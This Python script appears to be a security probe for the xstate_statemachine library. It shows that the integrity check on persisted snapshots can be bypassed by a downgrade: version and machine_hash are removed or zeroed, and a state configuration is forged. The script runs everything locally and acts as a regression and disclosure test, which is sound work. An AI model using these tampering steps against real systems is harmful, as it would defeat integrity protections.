# -*- coding: utf-8 -*-
"""R3 -- the #185 fix is keyed on a field the attacker also controls.

#185 replaced "bypass when `machine_hash` is missing" with "bypass when the
payload declares version 0 / no version". Both `version` and `machine_hash`
live in the same JSON object and are edited by the same hand, so the bypass
survives as a *downgrade*: strip (or zero) `version`, strip `machine_hash`,
and drift verification is off again under the default
`verify_machine_hash=True`.

This probe shows the full attack end to end on a machine whose STRUCTURE
differs, and shows that the resulting interpreter is live and mis-typed
(it accepts an event the snapshotting machine never had).

Also probes the asymmetric half of #186: `state_ids: []` beside a populated
`configuration` is not a contradiction the checker recognises, so
`configuration` still decides alone.
"""
from __future__ import annotations

import asyncio
import json

from xstate_statemachine import Interpreter, create_machine
from xstate_statemachine.clock import SimulatedClock

A = {"id": "m", "initial": "a", "states": {"a": {"on": {"GO": "b"}}, "b": {}}}
B = {
    "id": "m",
    "initial": "a",
    "states": {
        "a": {"on": {"GO": "b", "JUMP": "c"}},
        "b": {"on": {"BACK": "a"}},
        "c": {},
    },
}


async def main() -> None:
    i = Interpreter(create_machine(A), clock=SimulatedClock())
    await i.start()
    await asyncio.sleep(0.01)
    blob = i.get_persisted_snapshot()
    await i.stop()
    mB = create_machine(B)
    print("snapshot version=%r hash=%r" % (blob["version"], blob["machine_hash"]))
    print("machine A hash=%s  machine B hash=%s"
          % (create_machine(A).structure_hash, mB.structure_hash))

    # --- control: intact blob into B must be refused -------------------
    try:
        Interpreter.from_snapshot(json.dumps(blob), mB)
        print("CONTROL: ACCEPTED  <- control itself is broken")
    except Exception as exc:  # noqa: BLE001
        print("CONTROL intact -> %s (correct)" % type(exc).__name__)

    # --- attack 1: declare version 0, drop the hash --------------------
    for label, mutate in (
        ("version=0 + hash removed", lambda b: (b.update(version=0),
                                                b.pop("machine_hash", None))),
        ("version key removed + hash removed",
         lambda b: (b.pop("version", None), b.pop("machine_hash", None))),
        ("version=0 + hash=None", lambda b: (b.update(version=0, machine_hash=None),)),
    ):
        b = json.loads(json.dumps(blob))
        mutate(b)
        try:
            r = Interpreter.from_snapshot(json.dumps(b), create_machine(B))
        except Exception as exc:  # noqa: BLE001
            print("  %-36s REFUSED %s" % (label, type(exc).__name__))
            continue
        leaves = sorted(n.id for n in r._active_state_nodes if not n.states)
        await r.start()
        await r.send("JUMP")          # an event machine A never declared
        await asyncio.sleep(0.02)
        print("  %-36s ACCEPTED into DRIFTED machine: %s -> after JUMP %s"
              % (label, leaves, sorted(r.current_state_ids)))
        await r.stop()

    # --- attack 2: #186 asymmetry -------------------------------------
    print("\n=== #186 asymmetric half: state_ids=[] beside a forged configuration")
    b = json.loads(json.dumps(blob))
    b["state_ids"] = []
    b["configuration"] = ["m", "m.b"]
    try:
        r = Interpreter.from_snapshot(json.dumps(b), create_machine(A))
        print("  ACCEPTED -> leaves=%s (snapshot said m.a)"
              % sorted(n.id for n in r._active_state_nodes if not n.states))
    except Exception as exc:  # noqa: BLE001
        print("  REFUSED %s: %s" % (type(exc).__name__, str(exc)[:70]))


asyncio.run(main())
